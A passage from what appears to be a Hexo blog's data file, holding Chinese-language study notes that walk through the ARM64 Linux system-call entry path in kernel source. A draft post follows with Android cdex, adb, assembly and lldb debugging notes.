触发系统调用</span><br></pre></td></tr></table></figure></li>\n<li><p>触发异常后，会调用el0t_64_sync<br>el0代表此刻还在用户态<br>其定义在：<br>arch/arm64/kernel/entry.S</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">entry_handler\t0, t, 64, sync</span><br></pre></td></tr></table></figure>\n<p>enter_handler 是个宏定义，定义如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\t.macro entry_handler el:req, ht:req, regsize:req, label:req</span><br><span class=\"line\">SYM_CODE_START_LOCAL(el\\el\\ht\\()_\\regsize\\()_\\label)</span><br><span class=\"line\">\tkernel_entry \\el, \\regsize</span><br><span class=\"line\">\tmov\tx0, sp</span><br><span class=\"line\">\tbl\tel\\el\\ht\\()_\\regsize\\()_\\label\\()_handler</span><br><span class=\"line\">\t.if \\el == 0</span><br><span class=\"line\">\tb\tret_to_user</span><br><span class=\"line\">\t.else</span><br><span class=\"line\">\tb\tret_to_kernel</span><br><span class=\"line\">\t.endif</span><br><span class=\"line\">SYM_CODE_END(el\\el\\ht\\()_\\regsize\\()_\\label)</span><br><span class=\"line\">\t.endm</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>SYM_CODE_START_LOCAL 宏：通常用于定义局部代码符号的开始，确保生成的汇编标签符合特定的格式，</p>\n</li>\n</ol>\n<ul>\n<li><p>el\\el\\ht()_\\regsize()_\\label：</p>\n</li>\n<li><ul>\n<li>el\\el\\ht()_\\regsize()_\\label 这一部分展开成 el0t_64_sync，其中：</li>\n</ul>\n</li>\n<li><ul>\n<li><ul>\n<li>el\\el 是 el0。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><ul>\n<li><ul>\n<li>ht 是 t。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><ul>\n<li><ul>\n<li>regsize() 是 64_。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><ul>\n<li><ul>\n<li>label 是 sync。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><ul>\n<li>最终生成的符号名是 el0t_64_sync。</li>\n</ul>\n</li>\n<li><p>()_：</p>\n</li>\n<li><ul>\n<li><ul>\n<li>( )_ 表示在宏参数后插入一个下划线 _，以便将参数值与下一个部分连接起来。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><ul>\n<li><ul>\n<li>例如，\\regsize() 是 64_，即寄存器大小后跟一个下划线。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p>kernel_entry 宏，它通常用于设置进入内核时的上下文环境。这包括禁用中断、保存上下文和切换到内核模式等操作。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.macro\tkernel_entry, el, regsize = 64</span><br><span class=\"line\">.if\t\\el == 0</span><br><span class=\"line\">alternative_insn nop, SET_PSTATE_DIT(1), ARM64_HAS_DIT</span><br><span class=\"line\">.endif</span><br><span class=\"line\">.if\t\\regsize == 32</span><br><span class=\"line\">mov\tw0, w0\t\t\t\t// zero upper 32 bits of x0</span><br><span class=\"line\">.endif</span><br><span class=\"line\">stp\tx0, x1, [sp, #16 * 0]</span><br><span class=\"line\">stp\tx2, x3, [sp, #16 * 1]</span><br><span class=\"line\">stp\tx4, x5, [sp, #16 * 2]</span><br><span class=\"line\">stp\tx6, x7, [sp, #16 * 3]</span><br><span class=\"line\">stp\tx8, x9, [sp, #16 * 4]</span><br><span class=\"line\">stp\tx10, x11, [sp, #16 * 5]</span><br><span class=\"line\">stp\tx12, x13, [sp, #16 * 6]</span><br><span class=\"line\">stp\tx14, x15, [sp, #16 * 7]</span><br><span class=\"line\">stp\tx16, x17, [sp, #16 * 8]</span><br><span class=\"line\">stp\tx18, x19, [sp, #16 * 9]</span><br><span class=\"line\">stp\tx20, x21, [sp, #16 * 10]</span><br><span class=\"line\">stp\tx22, x23, [sp, #16 * 11]</span><br><span class=\"line\">stp\tx24, x25, [sp, #16 * 12]</span><br><span class=\"line\">stp\tx26, x27, [sp, #16 * 13]</span><br><span class=\"line\">stp\tx28, x29, [sp, #16 * 14]</span><br><span class=\"line\"></span><br><span class=\"line\">   ...</span><br><span class=\"line\">   .endm</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>调用 el0t_64_sync_handler<br>主要处理从 EL0（用户态）到 EL1（内核态）的64位同步异常</li>\n</ol>\n<p>函数定义和初始化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">asmlinkage void noinstr el0t_64_sync_handler(struct pt_regs *regs)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tunsigned long esr = read_sysreg(esr_el1);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>asmlinkage：这是一个宏，通常用于指定函数的调用约定，确保参数通过堆栈传递而不是通过寄存器传递。这对于内核和用户态之间的调用非常重要。<br>noinstr：这是一种属性，指示编译器不要在这个函数中插入调试或分析相关的指令。<br>el0t_64_sync_handler：函数名，处理 EL0 到 EL1 的64位同步异常。<br>struct pt_regs *regs：一个指向保存异常发生时 CPU 寄存器状态的结构体的指针。<br>unsigned long esr = read_sysreg(esr_el1)：读取异常综合寄存器（ESR），这个寄存器包含了异常的详细信息。<br>ESR_ELx_EC_SVC64：处理系统调用异常</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">switch (ESR_ELx_EC(esr)) &#123;</span><br><span class=\"line\">\tcase ESR_ELx_EC_SVC64:</span><br><span class=\"line\">\t\tel0_svc(regs);</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"4\">\n<li>el0_svc<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">static void noinstr el0_svc(struct pt_regs *regs)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tenter_from_user_mode(regs);</span><br><span class=\"line\">\tcortex_a76_erratum_1463225_svc_handler();</span><br><span class=\"line\">\tfp_user_discard();</span><br><span class=\"line\">\tlocal_daif_restore(DAIF_PROCCTX);</span><br><span class=\"line\">\tdo_el0_svc(regs);</span><br><span class=\"line\">\texit_to_user_mode(regs);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n这段代码定义了一个静态函数 el0_svc，用于处理从用户态（EL0）到内核态（EL1）的系统调用（SVC，Supervisor Call）异常。让我们按照之前解释的规则对这段代码进行详细解析。</li>\n</ol>\n<p>函数定义</p>\n<p>static void noinstr el0_svc(struct pt_regs *regs)<br>static：表示这个函数在定义它的文件中是私有的，不能被其他文件引用。<br>noinstr：这个属性指示编译器不要在这个函数中插入调试或分析相关的指令。<br>void：表示函数不返回任何值。<br>el0_svc：函数名，处理从EL0到EL1的系统调用异常。<br>struct pt_regs *regs：一个指向保存异常发生时CPU寄存器状态的结构体的指针。<br>函数实现</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">\tenter_from_user_mode(regs);</span><br><span class=\"line\">\tcortex_a76_erratum_1463225_svc_handler();</span><br><span class=\"line\">\tfp_user_discard();</span><br><span class=\"line\">\tlocal_daif_restore(DAIF_PROCCTX);</span><br><span class=\"line\">\tdo_el0_svc(regs);</span><br><span class=\"line\">\texit_to_user_mode(regs);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol>\n<li>enter_from_user_mode(regs)</li>\n</ol>\n<p>enter_from_user_mode(regs);<br>这个函数将上下文从用户模式切换到内核模式。它通常包括保存用户态寄存器、设置内核态堆栈等操作。<br>2. cortex_a76_erratum_1463225_svc_handler()</p>\n<p>cortex_a76_erratum_1463225_svc_handler();<br>这是一个特定于 Cortex-A76 处理器的错误处理程序。这个函数处理 Cortex-A76 处理器中的特定硬件错误（erratum 1463225）。<br>3. fp_user_discard()</p>\n<p>fp_user_discard();<br>这个函数用于丢弃用户态的浮点上下文，以确保在内核态不会使用用户态的浮点寄存器。这通常是为了安全性和上下文切换的正确性。<br>4. local_daif_restore(DAIF_PROCCTX)</p>\n<p>local_daif_restore(DAIF_PROCCTX);<br>这个函数用于恢复中断状态。DAIF_PROCCTX 是一个标志，用于指示当前的处理器上下文。这个函数通常会重新使能中断或其他处理器状态。<br>5. do_el0_svc(regs)</p>\n<p>do_el0_svc(regs);<br>这个函数处理实际的系统调用逻辑。regs 包含了系统调用号和参数，通过这个函数调用具体的系统调用处理函数。<br>6. exit_to_user_mode(regs)</p>\n<p>exit_to_user_mode(regs);<br>这个函数将上下文从内核模式切换回用户模式。它通常包括恢复用户态寄存器、设置用户态堆栈等操作。</p>\n<p>总结<br>el0_svc 函数处理从用户态到内核态的系统调用异常。具体步骤如下：</p>\n<ul>\n<li>进入内核模式：通过 enter_from_user_mode 保存用户态上下文并切换到内核模式。</li>\n<li>处理特定处理器错误：通过 cortex_a76_erratum_1463225_svc_handler 处理 Cortex-A76 处理器的特定错误。</li>\n<li>丢弃用户态浮点上下文：通过 fp_user_discard 确保内核态不会使用用户态浮点寄存器。</li>\n<li>恢复中断状态：通过 local_daif_restore 恢复处理器的中断状态。</li>\n<li>处理系统调用：通过 do_el0_svc 调用具体的系统调用处理函数。<br>返回用户模式：通过 exit_to_user_mode 恢复用户态上下文并返回用户模式。</li>\n</ul>\n<ol start=\"5\">\n<li><p>do_el0_svc</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void do_el0_svc(struct pt_regs *regs)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tel0_svc_common(regs, regs-&gt;regs[8], __NR_syscalls, sys_call_table);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li>\n<li><p>el0_sev_common</p>\n</li>\n</ol>\n<p>函数定义</p>\n<p>static void el0_svc_common(struct pt_regs *regs, int scno, int sc_nr,<br>                           const syscall_fn_t syscall_table[])<br>static：表示这个函数在定义它的文件中是私有的，不能被其他文件引用。<br>void：表示函数不返回任何值。<br>el0_svc_common：函数名，处理从 EL0（用户态）到 EL1（内核态）的系统调用。<br>struct pt_regs *regs：一个指向保存异常发生时 CPU 寄存器状态的结构体的指针。<br>int scno：系统调用号。<br>int sc_nr：系统调用的总数量。<br>const syscall_fn_t syscall_table[]：系统调用表，包含所有系统调用的函数指针。<br>函数实现<br>初始化和上下文保存</p>\n<p>unsigned long flags = read_thread_flags();</p>\n<p>regs-&gt;orig_x0 = regs-&gt;regs[0];<br>regs-&gt;syscallno = scno;<br>read_thread_flags()：读取当前线程的标志。<br>regs-&gt;orig_x0 = regs-&gt;regs[0]：保存原始的 x0 寄存器值。<br>regs-&gt;syscallno = scno：保存系统调用号。<br>注释部分：BTI 处理说明</p>\n<p>/*</p>\n<ul>\n<li>BTI note:</li>\n<li>The architecture does not guarantee that SPSR.BTYPE is zero</li>\n<li>on taking an SVC, so we could return to userspace with a</li>\n<li>non-zero BTYPE after the syscall.</li>\n<li></li>\n<li>This shouldn’t matter except when userspace is explicitly</li>\n<li>doing something stupid, such as setting PROT_BTI on a page</li>\n<li>that lacks conforming BTI/PACIxSP instructions, falling</li>\n<li>through from one executable page to another with differing</li>\n<li>PROT_BTI, or messing with BTYPE via ptrace: in such cases,</li>\n<li>userspace should not be surprised if a SIGILL occurs on</li>\n<li>syscall return.</li>\n<li></li>\n<li>So, don’t touch regs-&gt;pstate &amp; PSR_BTYPE_MASK here.</li>\n<li>(Similarly for HVC and SMC elsewhere.)</li>\n<li>/<br>这段注释解释了 BTI（Branch Target Identification）的处理和可能出现的问题。主要说明不要修改 regs-&gt;pstate 中的 PSR_BTYPE_MASK 位。<br>处理异步标记检查故障</li>\n</ul>\n<p>if (flags &amp; _TIF_MTE_ASYNC_FAULT) {<br>    syscall_set_return_value(current, regs, -ERESTARTNOINTR, 0);<br>    return;<br>}<br>检查 _TIF_MTE_ASYNC_FAULT 标志，如果设置了这个标志，表示有异步的标记检查故障需要处理。<br>syscall_set_return_value(current, regs, -ERESTARTNOINTR, 0)：设置系统调用返回值为 -ERESTARTNOINTR，表示系统调用需要重启。<br>return：返回，不继续执行后续的系统调用处理。<br>处理系统调用的额外工作</p>\n<p>if (has_syscall_work(flags)) {<br>    if (scno == NO_SYSCALL)<br>        syscall_set_return_value(current, regs, -ENOSYS, 0);<br>    scno = syscall_trace_enter(regs);<br>    if (scno == NO_SYSCALL)<br>        goto trace_exit;<br>}<br>has_syscall_work(flags)：检查是否有系统调用需要处理的额外工作，例如 ptrace 相关的操作。<br>如果系统调用号为 NO_SYSCALL，设置返回值为 -ENOSYS（系统调用不存在）。<br>syscall_trace_enter(regs)：处理系统调用进入的跟踪逻辑，并返回可能修改过的系统调用号。<br>如果系统调用号仍然是 NO_SYSCALL，跳转到 trace_exit 标签，进行系统调用退出的跟踪逻辑。<br>调用具体的系统调用</p>\n<p>invoke_syscall(regs, scno, sc_nr, syscall_table);<br>invoke_syscall(regs, scno, sc_nr, syscall_table)：调用系统调用表中的具体系统调用函数。<br>检查和处理系统调用退出的跟踪逻辑</p>\n<p>if (!has_syscall_work(flags) &amp;&amp; !IS_ENABLED(CONFIG_DEBUG_RSEQ)) {<br>    flags = read_thread_flags();<br>    if (!has_syscall_work(flags) &amp;&amp; !(flags &amp; _TIF_SINGLESTEP))<br>        return;<br>}</p>\n<p>trace_exit:<br>syscall_trace_exit(regs);<br>再次检查是否有系统调用需要处理的额外工作以及是否启用了 RSEQ（重启动序列）调试。<br>如果没有额外工作需要处理，并且没有启用单步调试，则直接返回。<br>如果有工作需要处理，或者启用了单步调试，调用 syscall_trace_exit(regs) 进行系统调用退出的跟踪逻辑。<br>总结<br>el0_svc_common 函数处理系统调用的主要逻辑，包括：</p>\n<p>保存上下文：保存原始寄存器值和系统调用号。<br>处理异步标记检查故障：在系统调用实际执行前，处理异步标记检查故障。<br>处理系统调用的额外工作：包括 ptrace 相关的操作。<br>调用具体的系统调用：根据系统调用号，从系统调用表中调用具体的系统调用函数。<br>处理系统调用退出的跟踪逻辑：包括检查系统调用退出时是否需要进行额外的处理。<br>通过这些步骤，确保系统调用的执行是安全且符合预期的，同时处理了系统调用前后的各种特殊情况。</p>\n<p>6.invoke_syscall()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">static void invoke_syscall(struct pt_regs *regs, unsigned int scno,</span><br><span class=\"line\">\t\t\t   unsigned int sc_nr,</span><br><span class=\"line\">\t\t\t   const syscall_fn_t syscall_table[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tlong ret;</span><br><span class=\"line\"></span><br><span class=\"line\">\tadd_random_kstack_offset();</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (scno &lt; sc_nr) &#123;</span><br><span class=\"line\">\t\tsyscall_fn_t syscall_fn;</span><br><span class=\"line\">\t\tsyscall_fn = syscall_table[array_index_nospec(scno, sc_nr)];</span><br><span class=\"line\">\t\tret = __invoke_syscall(regs, syscall_fn);</span><br><span class=\"line\">\t&#125; else &#123;</span><br><span class=\"line\">\t\tret = do_ni_syscall(regs, scno);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tsyscall_set_return_value(current, regs, 0, ret);</span><br><span class=\"line\"></span><br><span class=\"line\">\t/*</span><br><span class=\"line\">\t * Ultimately, this value will get limited by KSTACK_OFFSET_MAX(),</span><br><span class=\"line\">\t * but not enough for arm64 stack utilization comfort. To keep</span><br><span class=\"line\">\t * reasonable stack head room, reduce the maximum offset to 9 bits.</span><br><span class=\"line\">\t *</span><br><span class=\"line\">\t * The actual entropy will be further reduced by the compiler when</span><br><span class=\"line\">\t * applying stack alignment constraints: the AAPCS mandates a</span><br><span class=\"line\">\t * 16-byte (i.e. 4-bit) aligned SP at function boundaries.</span><br><span class=\"line\">\t *</span><br><span class=\"line\">\t * The resulting 5 bits of entropy is seen in SP[8:4].</span><br><span class=\"line\">\t */</span><br><span class=\"line\">\tchoose_random_kstack_offset(get_random_u16() &amp; 0x1FF);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>让我们按照之前的规则对 invoke_syscall 函数进行详细解析。这段代码用于调用系统调用处理函数，根据系统调用号选择合适的系统调用处理程序，并设置返回值。</p>\n<p>函数定义</p>\n<p>static void invoke_syscall(struct pt_regs *regs, unsigned int scno,<br>               unsigned int sc_nr,<br>               const syscall_fn_t syscall_table[])<br>static：表示这个函数在定义它的文件中是私有的，不能被其他文件引用。<br>void：表示函数不返回任何值。<br>invoke_syscall：函数名，处理系统调用的实际执行。<br>struct pt_regs *regs：一个指向保存异常发生时 CPU 寄存器状态的结构体的指针。<br>unsigned int scno：系统调用号。<br>unsigned int sc_nr：系统调用的总数量。<br>const syscall_fn_t syscall_table[]：系统调用表，包含所有系统调用的函数指针。<br>函数实现<br>添加随机堆栈偏移</p>\n<p>add_random_kstack_offset();<br>add_random_kstack_offset()：这个函数用于添加一个随机的内核堆栈偏移，增加堆栈布局的随机性以提高安全性。<br>调用具体的系统调用</p>\n<p>if (scno &lt; sc_nr) {<br>    syscall_fn_t syscall_fn;<br>    syscall_fn = syscall_table[array_index_nospec(scno, sc_nr)];<br>    ret = __invoke_syscall(regs, syscall_fn);<br>} else {<br>    ret = do_ni_syscall(regs, scno);<br>}<br>if (scno &lt; sc_nr)：检查系统调用号是否在有效范围内（即是否小于总的系统调用数量）。<br>有效系统调用：<br>syscall_fn_t syscall_fn;：声明一个系统调用函数指针。<br>syscall_fn = syscall_table[array_index_nospec(scno, sc_nr)];：从系统调用表中获取对应的系统调用函数，使用 array_index_nospec 来防止投机执行漏洞。<br>ret = __invoke_syscall(regs, syscall_fn);：调用具体的系统调用处理函数，并将返回值保存到 ret 中。<br>无效系统调用：<br>ret = do_ni_syscall(regs, scno);：调用未实现的系统调用处理函数 do_ni_syscall，并将返回值保存到 ret 中。<br>设置系统调用返回值</p>\n<p>syscall_set_return_value(current, regs, 0, ret);<br>syscall_set_return_value(current, regs, 0, ret)：设置系统调用的返回值。<br>current：当前进程的任务结构指针。<br>regs：保存寄存器状态的结构指针。<br>0：系统调用成功的标志（通常为 0）。<br>ret：系统调用的返回值。<br>选择新的随机堆栈偏移</p>\n<p>/*</p>\n<ul>\n<li>Ultimately, this value will get limited by KSTACK_OFFSET_MAX(),</li>\n<li>but not enough for arm64 stack utilization comfort. To keep</li>\n<li>reasonable stack head room, reduce the maximum offset to 9 bits.</li>\n<li></li>\n<li>The actual entropy will be further reduced by the compiler when</li>\n<li>applying stack alignment constraints: the AAPCS mandates a</li>\n<li>16-byte (i.e. 4-bit) aligned SP at function boundaries.</li>\n<li></li>\n<li>The resulting 5 bits of entropy is seen in SP[8:4].</li>\n<li>/<br>choose_random_kstack_offset(get_random_u16() &amp; 0x1FF);<br>注释部分解释了为什么要限制堆栈偏移值，并确保其合理性和安全性。<br>choose_random_kstack_offset(get_random_u16() &amp; 0x1FF)：选择一个新的随机堆栈偏移值。<br>get_random_u16() &amp; 0x1FF：生成一个 16 位的随机数，并将其与 0x1FF 进行与操作，限制偏移值在 9 位以内。<br>总结<br>invoke_syscall 函数主要负责调用系统调用处理函数，具体步骤如下：</li>\n</ul>\n<p>添加随机堆栈偏移：通过 add_random_kstack_offset() 增加堆栈布局的随机性。<br>检查系统调用号的有效性：如果系统调用号在有效范围内，从系统调用表中获取对应的处理函数并调用它；否则调用未实现的系统调用处理函数。<br>设置系统调用返回值：通过 syscall_set_return_value(current, regs, 0, ret) 设置系统调用的返回值。<br>选择新的随机堆栈偏移：通过 choose_random_kstack_offset(get_random_u16() &amp; 0x1FF) 选择一个新的随机堆栈偏移值。<br>通过这些步骤，invoke_syscall 确保系统调用的执行过程是安全的，并增加了堆栈布局的随机性以提高安全性。</p>\n<ol start=\"7\">\n<li>static long __invoke_syscall(struct pt_regs *regs, syscall_fn_t syscall_fn)<br>{<br> return syscall_fn(regs);<br>}<br>这里便开始执行真正的系统调用函数。</li>\n</ol>\n"},{"_content":"cdex001  https://github.com/AlienwareHe/RDex\n在安卓9中为了减少内存的使用量，引入了cdex，magic为cdex001，这导致我们dump出来的dex不是一个正常的Dex结构，无法被jadx等反编译。\n\n\n\nadb shell pm list packages 展示包\n展示包所在的路径\nadb shell pm path com.android.systemui\n\n\n汇编：\n```\nmain:                                   // @main\n\t.cfi_startproc\n// %bb.0:\n\tsub\tsp, sp, #64                     // =64\n\tstp\tx29, x30, [sp, #48]             // 16-byte Folded Spill\n\tadd\tx29, sp, #48                    // =48\n\t.cfi_def_cfa w29, 16\n\t.cfi_offset w30, -8\n\t.cfi_offset w29, -16\n\tmov\tw8, wzr\n\tstr\tw8, [sp, #20]                   // 4-byte Folded Spill\n\tstur\twzr, [x29, #-4]\n\tadrp\tx8, .L.str\n\tadd\tx8, x8, :lo12:.L.str\n\tstur\tx8, [x29, #-16]\n\tadrp\tx8, .L__const.main.buffer\n\tadd\tx8, x8, :lo12:.L__const.main.buffer\n\tldr\tw9, [x8]\n\tadd\tx10, sp, #24                    // =24\n\tstr\tx10, [sp, #8]                   // 8-byte Folded Spill\n\tstr\tw9, [sp, #24]\n\tldrh\tw8, [x8, #4]\n\tstrh\tw8, [sp, #28]\n\tldur\tx0, [x29, #-16]\n\tbl\tprintf\n\tldr\tx0, [sp, #8]                    // 8-byte Folded Reload\n\tbl\tprintf\n\tldr\tw0, [sp, #20]                   // 4-byte Folded Reload\n\tldp\tx29, x30, [sp, #48]             // 16-byte Folded Reload\n\tadd\tsp, sp, #64                     // =64\n\tret\n.Lfunc_end2:\n\t.size\tmain, .Lfunc_end2-main\n\t.cfi_endproc\n                                        // -- End function\n\t.type\t.L.str,@object                  // @.str\n\t.section\t.rodata.str1.1,\"aMS\",@progbits,1\n.L.str:\n\t.asciz\t\"hello\"\n\t.size\t.L.str, 6\n\n\t.type\t.L__const.main.buffer,@object   // @__const.main.buffer\n.L__const.main.buffer:\n\t.asciz\t\"hello\"\n\t.size\t.L__const.main.buffer, 6\n```\n(lldb) register read sp\n      sp = 0x0000007ffffffd80\n(lldb) memoey read 0x0000007ffffffd80\nerror: 'memoey' is not a valid command.\n(lldb) memory read 0x0000007ffffffd80\n0x7ffffffd80: 00 00 00 00 00 00 00 00 98 fd ff ff 7f 00 00 00  ................\n0x7ffffffd90: 00 00 00 00 00 00 00 00 68 65 6c 6c 6f 00 00 00  ........hello...\n(lldb) memory read -c 0x60  0x0000007ffffffd80\n0x7ffffffd80: 00 00 00 00 00 00 00 00 98 fd ff ff 7f 00 00 00  ................\n0x7ffffffd90: 00 00 00 00 00 00 00 00 68 65 6c 6c 6f 00 00 00  ........hello...\n0x7ffffffda0: 78 55 55 55 55 00 00 00 00 00 00 00 00 00 00 00  xUUUU...........\n0x7ffffffdb0: c0 fd ff ff 7f 00 00 00 70 63 aa f4 7f 00 00 00  ........pc......\n0x7ffffffdc0: 10 fe ff ff 7f 00 00 00 f4 66 55 55 55 00 00 00  .........fUUU...\n0x7ffffffdd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n\n\nc++\n","source":"_drafts/various.md","raw":"cdex001  https://github.com/AlienwareHe/RDex\n在安卓9中为了减少内存的使用量，引入了cdex，magic为cdex001，这导致我们dump出来的dex不是一个正常的Dex结构，无法被jadx等反编译。\n\n\n\nadb shell pm list packages 展示包\n展示包所在的路径\nadb shell pm path com.android.systemui\n\n\n汇编：\n```\nmain:                                   // @main\n\t.cfi_startproc\n// %bb.0:\n\tsub\tsp, sp, #64                     // =64\n\tstp\tx29, x30, [sp, #48]             // 16-byte Folded Spill\n\tadd\tx29, sp, #48                    // =48\n\t.cfi_def_cfa w29, 16\n\t.cfi_offset w30, -8\n\t.cfi_offset w29, -16\n\tmov\tw8, wzr\n\tstr\tw8, [sp, #20]                   // 4-byte Folded Spill\n\tstur\twzr, [x29, #-4]\n\tadrp\tx8, .L.str\n\tadd\tx8, x8, :lo12:.L.str\n\tstur\tx8, [x29, #-16]\n\tadrp\tx8, .L__const.main.buffer\n\tadd\tx8, x8, :lo12:.L__const.main.buffer\n\tldr\tw9, [x8]\n\tadd\tx10, sp, #24                    // =24\n\tstr\tx10, [sp, #8]                   // 8-byte Folded Spill\n\tstr\tw9, [sp, #24]\n\tldrh\tw8, [x8, #4]\n\tstrh\tw8, [sp, #28]\n\tldur\tx0, [x29, #-16]\n\tbl\tprintf\n\tldr\tx0, [sp, #8]                    // 8-byte Folded Reload\n\tbl\tprintf\n\tldr\tw0, [sp, #20]                   // 4-byte Folded Reload\n\tldp\tx29, x30, [sp, #48]             // 16-byte Folded Reload\n\tadd\tsp, sp, #64                     // =64\n\tret\n.Lfunc_end2:\n\t.size\tmain, .Lfunc_end2-main\n\t.cfi_endproc\n                                        // -- End function\n\t.type\t.L.str,@object                  // @.str\n\t.section\t.rodata.str1.1,\"aMS\",@progbits,1\n.L.str:\n\t.asciz\t\"hello\"\n\t.size\t.L.str, 6\n\n\t.type\t.L__const.main.buffer,@object   // @__const.main.buffer\n.L__const.main.buffer:\n\t.asciz\t\"hello\"\n\t.size\t.L__const.main.buffer, 6\n```\n(lldb) register read sp\n      sp = 0x0000007ffffffd80\n(lldb) memoey read 0x0000007ffffffd80\nerror: 'memoey' is not a valid command.\n(lldb) memory read 0x0000007ffffffd80\n0x7ffffffd80: 00 00 00 00 00 00 00 00 98 fd ff ff 7f 00 00 00  ................\n0x7ffffffd90: 00 00 00 00 00 00 00 00 68 65 6c 6c 6f 00 00 00  ........hello...\n(lldb) memory read -c 0x60  0x0000007ffffffd80\n0x7ffffffd80: 00 00 00 00 00 00 00 00 98 fd ff ff 7f 00 00 00  ................\n0x7ffffffd90: 00 00 00 00 00 00 00 00 68 65 6c 6c 6f 00 00 00  ........hello...\n0x7ffffffda0: 78 55 55 55 55 00 00 00 00 00 00 00 00 00 00 00  xUUUU...........\n0x7ffffffdb0: c0 fd ff ff 7f 00 00 00 70 63 aa f4 7f 00 00 00  ........pc......\n0x7ffffffdc0: 10 fe ff ff 7f 00 00 00 f4 66 55 55 55 00 00 00  .........fUUU...\n0x7ffffffdd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n\n\nc++\n","slug":"various","published":0,"date":"2024-07-12T15:52:34.902Z","updated":"2024-07-22T14:54:51.000Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44rit0000hv8fy5bm31vks","content":"<p>cdex001  <a 